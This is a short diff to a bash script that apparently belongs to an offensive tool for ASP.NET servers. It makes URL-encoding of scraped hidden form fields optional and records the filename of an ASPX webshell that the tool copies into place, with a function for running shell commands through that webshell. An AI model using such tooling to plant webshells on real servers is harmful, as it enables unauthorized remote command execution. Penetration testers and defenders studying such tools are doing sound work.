@@ -51,7 +51,9 @@ extract_hidden_input() {
     echo "$form_content" | grep -oE '<input[^>]*type="hidden"[^>]*>' | while read -r input; do
         name=$(echo "$input" | sed -n 's/.*name="\([^"]*\)".*/\1/p')
         value=$(echo "$input" | sed -n 's/.*value="\([^"]*\)".*/\1/p')
-        value=$(urlencode "$value")
+        if [[ -z "$urlencode_values" ]] || [[ "$urlencode_values" == "true" ]]; then
+            value=$(urlencode "$value")
+        fi       
         if [[ -n "$name" ]]; then
             echo "${name}=${value}"
         fi
@@ -219,7 +221,7 @@ extract_current_input_from_response() {
 
 create_aspx_webshell() {
     cp $SCRIPTDIR/../aspx/webshell.aspx .
-
+    webshell_filename="webshell.aspx"
 }
 
 run_aspx_shell_command() {
